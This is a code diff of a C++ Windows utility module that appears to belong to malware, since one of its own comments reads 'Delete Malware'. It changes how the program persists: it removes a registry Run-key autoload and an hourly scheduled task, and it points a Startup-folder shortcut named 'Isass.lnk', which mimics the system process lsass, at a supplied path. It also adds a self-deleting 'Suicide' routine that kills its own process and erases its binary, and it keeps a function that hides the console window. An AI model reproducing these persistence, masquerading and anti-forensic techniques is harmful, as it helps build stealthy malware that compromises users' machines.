@@ -10,13 +10,6 @@ void Utils::HideConsole()
 	ShowWindow(Stealth, 0);
 }
 
-/* Add file to autoload */
-void Utils::Autoload(string Name, string Path)
-{
-	string command = "REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V " + Name + " /t REG_SZ /F /D " + Path;
-	system(command.c_str());
-}
-
 /* Check file exists */
 bool Utils::FileExists(const char *fname)
 {
@@ -124,22 +117,65 @@ DWORD Utils::FindProcessId(const std::wstring& processName)
 	return 0;
 }
 
+// get process name
+string Utils::getProcessName(DWORD pId)
+{
+	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
+
+	if (NULL != hProcess)
+	{
+		HMODULE hMod;
+		DWORD cbNeeded;
+
+		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
+		{
+			GetModuleBaseName(hProcess, hMod, (LPWSTR)szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
+		}
+	}
+	CloseHandle(hProcess);
+
+	std::wstring arr_w(szProcessName);
+	std::string arr_s(arr_w.begin(), arr_w.end());
+
+	return arr_s;
+}
+
+string Utils::getCurrentWorkDir()
+{
+	char current_work_dir[FILENAME_MAX];
+	_getcwd(current_work_dir, sizeof(current_work_dir));
+
+	return (string)current_work_dir;
+}
+
 // Command Prompt =====================================================================
 
 /* Create Shortcut to Autoload in Current User */
-void Utils::createAutoLoadShortcut()
+void Utils::createAutoLoadShortcut(string fpath)
 {
 	system("echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs");
 	system("echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Isass.lnk\" >> CreateShortcut.vbs");
 	system("echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs");
-	system("echo oLink.TargetPath = \"C:\\Windows\\notepad.exe\" >> CreateShortcut.vbs");
+	string _cmd = "echo oLink.TargetPath = \"" + fpath + "\" >> CreateShortcut.vbs";
+	system(_cmd.c_str());
 	system("echo oLink.Save >> CreateShortcut.vbs");
 	system("cscript CreateShortcut.vbs");
 	system("del CreateShortcut.vbs");
 }
 
-/* Create task in Task Scheduler */
-void createAutoloadTask()
+/* Delete Malware */
+void Utils::Suicide()
 {
-	system("powershell.exe SCHTASKS.exe /Create /SC HOURLY /TN \"System Host\" /TR C:\\ProgramData\\MicrosoftCorporation\\Windows\\SystemData\\Isass.exe /F");
+	Utils utils;
+	string command = "taskkill /im " + utils.getProcessName(GetCurrentProcessId())
+		+ " /f & erase " + utils.getCurrentWorkDir()
+		+ "\\" + utils.getProcessName(GetCurrentProcessId()) + " & exit";
+	system(command.c_str());
+}
+
+// PowerShell =========================================================================
+void CreateRestoreScript()
+{
+
 }
